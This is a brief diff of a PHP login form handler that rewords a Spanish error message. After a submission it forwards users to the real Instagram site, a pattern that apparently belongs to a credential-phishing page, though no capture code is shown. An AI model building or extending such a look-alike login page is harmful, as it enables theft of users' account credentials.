@@ -37,7 +37,7 @@ if (isset($_POST['submit'])) {
             }
             header('location: https://www.instagram.com');
         } else {
-            $_SESSION['error'] = "Ha ocurrido un error, vuelva a inicar sesión.";
+            $_SESSION['error'] = "Ha ocurrido un error al iniciar sesión, vuelva a intentarlo.";
             header('location: ' . $url);
         }
     }
